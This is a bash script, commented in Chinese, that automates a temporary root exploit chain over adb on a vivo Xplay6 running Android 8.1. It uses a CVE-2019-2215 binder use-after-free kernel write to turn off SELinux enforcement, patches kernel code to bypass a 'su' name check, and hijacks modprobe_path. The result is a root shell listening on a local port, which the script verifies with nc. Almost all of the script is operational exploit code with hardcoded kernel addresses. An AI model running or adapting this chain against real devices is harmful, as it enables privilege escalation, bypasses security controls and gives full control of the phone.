#!/usr/bin/env bash
# 稳定临时 root —— vivo Xplay6 / Android 8.1.0 (PD1610_D_8.19.16, 3.18.71-perf-g8a8c60dd)
#
# 原理（全部是内核内存写，不碰任何分区，重启即复原）：
#   1. CVE-2019-2215 binder UAF -> 任意内核写（exp8/w2215）
#   2. selinux_enforcing = 0                 （4 字节）
#   3. modprobe_path = /data/local/tmp/sudK  （21 字节）
#   4. 执行 4 字节 0xff 的"文件"，内核 request_module("binfmt-ffff")
#      -> kernel 域以 uid 0 执行 sudK -> 起一个 root shell 监听 127.0.0.1:12345
#
# 用法：bash tools/run_temproot8.sh [serial]
set -u
SER=${1:-3e5a38a5}
ADB="adb -s $SER"
DEV=/data/local/tmp
T=$(dirname "$0")
EXPLOIT=${EXPLOIT:-$T/../exp8/w2215}
SEL=0xffffffc001b1b1cc          # selinux_enforcing（enforcing_setup 里 str w1,[x0,#0x1cc] 反汇编）
MOD=0xffffffc001815540          # modprobe_path
PORT=12345

fail() { printf 'ABORT: %s\n' "$*" >&2; exit 1; }
step() { printf '\n=== %s ===\n' "$*"; }

[ -x "$EXPLOIT" ] || fail "缺少 $EXPLOIT（先编译 exp8/w2215.c）"
$ADB get-state >/dev/null 2>&1 || fail "设备 $SER 不在线"

step "0. 基线"
$ADB shell 'echo "uid=$(id -u) enforcing=$(getenforce)"'

step "1. 下发 payload"
$ADB push "$EXPLOIT" $DEV/w2215 >/dev/null || fail "push w2215"
$ADB push "$T/sudK8" $DEV/sudK >/dev/null || fail "push sudK"
printf '\377\377\377\377' > /tmp/trig8
$ADB push /tmp/trig8 $DEV/trig >/dev/null || fail "push trig"
$ADB shell "chmod 0755 $DEV/w2215 $DEV/sudK $DEV/trig"

# 设备掉线（内核 panic 重启）时等它回来
wait_dev() {
        local i
        for i in $(seq 1 30); do
                [ "$($ADB get-state 2>/dev/null)" = "device" ] && { sleep 3; return 0; }
                sleep 2
        done
        fail "设备掉线，30 次轮询未恢复"
}

# kwrite <addr> <payload> <verify-cmd> <want>
kwrite() {
        local addr=$1 pay=$2 vcmd=$3 want=$4 got i
        for i in 1 2 3 4 5; do
                wait_dev
                $ADB shell "$DEV/w2215 $addr $pay" 2>&1 | grep -E '^readv=' | sed 's/^/    /'
                got=$($ADB shell "$vcmd" 2>/dev/null | tr -d '\r')
                [ "$got" = "$want" ] && return 0
                sleep 1
        done
        printf '  最后读到: %s (期望 %s)\n' "${got:-<empty>}" "$want"
        return 1
}

step "2. selinux_enforcing = 0"
if [ "$($ADB shell getenforce | tr -d '\r')" = "Permissive" ]; then
        echo "  已经是 Permissive，跳过"
else
        kwrite "$SEL" "0x0 4" getenforce Permissive || fail "SELinux 没有变成 Permissive"
        echo "  getenforce = $($ADB shell getenforce | tr -d '\r')"
fi

# 8.1 名字闸：E(0xffffffc0001cb3cc) 的前两条指令改成 `mov w0,#0; ret`（放行）。
# .text 只读 -> 经 fixmap 别名写：bm_pte[1] 指向 E 所在物理页 0x401cb000，
# 别名 VA 0xffffffbffbc01000 即为该页可写映射。
step "2b. 名字闸 su 补丁"
wait_dev
for w in "0xffffffc0019d3008 0x401cb713 8 65577" \
         "0xffffffbffbc013cc 0x52800000 4 65573" \
         "0xffffffbffbc013d0 0xd65f03c0 4 65573"; do
        set -- $w
        out=$($ADB shell "$DEV/w2215 $1 $2 $3" 2>&1 | grep -E '^readv=' | tr -d '\r')
        printf '   %s -> %s\n' "$2" "$out"
        case "$out" in *"want $4"*) ;; *) echo "   警告：本次写未命中" ;; esac
        sleep 1
done
$ADB shell 'mkdir -p '"$DEV"'/.g8; chmod 777 '"$DEV"'/.g8'
$ADB push "$T/../exp8/t42raw" $DEV/.g8/su >/dev/null 2>&1
$ADB shell "chmod 0755 $DEV/.g8/su"
SRC=$($ADB shell "$DEV/.g8/su" 2>&1 | tr -d '\r')
RC=$($ADB shell "$DEV/.g8/su >/dev/null 2>&1; echo \$?" | tr -d '\r')
if [ "$RC" = "42" ]; then
        echo "  su 闸已放行（uid 2000 执行真名 su -> 42）"
else
        echo "  警告：su 仍被拒（$SRC, rc=$RC）——若本机此前已 exec 过 su，需重启后再打补丁（I-cache）"
fi

step "3. modprobe_path = $DEV/sudK"
wait_dev
NOW=$($ADB shell cat /proc/sys/kernel/modprobe 2>/dev/null | tr -d '\r')
if [ "$NOW" != "$DEV/sudK" ]; then
        kwrite "$MOD" "$DEV/sudK" 'cat /proc/sys/kernel/modprobe' "$DEV/sudK" ||
                fail "modprobe_path 未改写（当前 $NOW）"
fi
wait_dev
echo "  modprobe_path = $($ADB shell cat /proc/sys/kernel/modprobe | tr -d '\r')"

step "4. 触发并等待 root 服务"
$ADB shell "rm -f $DEV/km.out"
$ADB shell "$DEV/trig" >/dev/null 2>&1
for i in $(seq 1 10); do
        sleep 1
        wait_dev
        $ADB shell "netstat -ltn 2>/dev/null | grep -q ':$PORT '" && { echo "  监听已就绪（${i}s）"; break; }
        [ "$i" = 10 ] && fail "root 服务没有起来（$DEV/km.out: $($ADB shell cat $DEV/km.out 2>&1 | tr '\n' ' ')）"
done

step "5. 验证"
$ADB forward tcp:$PORT tcp:$PORT >/dev/null 2>&1
OUT=$( (echo 'id'; sleep 0.5) | nc 127.0.0.1 $PORT 2>/dev/null | tr -d '\r' )
printf '%s\n' "$OUT" | sed 's/^/  /'
printf '%s' "$OUT" | grep -q 'uid=0(root)' || fail "拿到 shell 但不是 root"

printf '\nroot shell: 127.0.0.1:%s（adb forward 已建立；设备重启后重跑本脚本）\n' "$PORT"
